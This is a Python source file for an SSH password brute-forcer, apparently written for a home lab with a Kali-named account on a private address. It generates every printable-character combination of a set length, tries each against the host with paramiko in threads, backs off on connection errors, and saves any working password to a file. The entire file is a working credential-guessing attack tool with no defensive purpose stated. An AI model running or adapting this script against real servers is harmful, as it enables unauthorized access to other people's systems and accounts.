from itertools import product
import random
from threading import Thread, Event
import paramiko
import time
import os
from pathlib import Path
import base64


crack_file = Path("./cracked.txt")
sleep_flag = Event()

username: str = "kali2"
host: str = "192.168.64.18"
port: int = 22

character_set = "".join([chr(x) for x in range(32, 127)]).replace(' ', '')
# character_set += extract_alphabetic_characters(character_set).capitalize()

untested_pws = []


def ssh_brute(pw: str, save: bool = True):
    global username
    global host
    global port
    global sleep_flag
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, port, username, pw, auth_timeout=0.5)
        with open("./cracked.txt", "w") as f:
            f.write(
                f"host: {host}, port: {port}, username: {username}, password: {pw}")
        return True

    except paramiko.AuthenticationException:
        print("[***] Auth Exception [***]")
        return False
    except paramiko.SSHException:
        print("[!*!] Banner Exception [!*!]")
        if save:
            untested_pws.append(pw)
        print("untested: ", untested_pws)
        sleep_flag.set()
        return None


def shuffle_string(input_str):
    # Convert the string to a list of characters
    char_list = list(input_str)

    # Shuffle the list of characters in a random order
    random.shuffle(char_list)

    # Join the shuffled characters back into a string
    shuffled_str = ''.join(char_list)

    return shuffled_str


def gen_combinations(char_len):
    return [''.join(p) for p in product(character_set, repeat=char_len) if len(''.join(p)) == char_len]


def crack_(char_len):
    global character_set
    combinations = gen_combinations(char_len)
    print("Estimated crack time ≈(h): ", (len(combinations) * 1)/60/60)
    for c in combinations:
        if crack_file.is_file():
            break
        print(c)
        if sleep_flag.is_set():
            while ssh_brute(c, save=False) == None:
                time.sleep(5)
                pass

            sleep_flag.clear()

        t = Thread(target=ssh_brute, args=(c,))
        t.start()
        time.sleep(1)

    return False


def extract_alphabetic_characters(input_string: str):
    # Initialize an empty string to store the alphabetic characters
    result = ""

    # Iterate through each character in the input string
    for char in input_string:
        # Check if the character is alphabetic (a letter)
        if char.isalpha():
            # If it is alphabetic, add it to the result string
            result += char

    return result


if __name__ == '__main__':
    print("SSH")
    username = input("Username: \n")
    res = crack_(3)
    if crack_file.is_file():
        exit(0)
    if not res:
        for untested in untested_pws:
            if ssh_brute(untested):
                print(untested)
                break
            untested_pws.remove(untested)
    else:
        print(res)
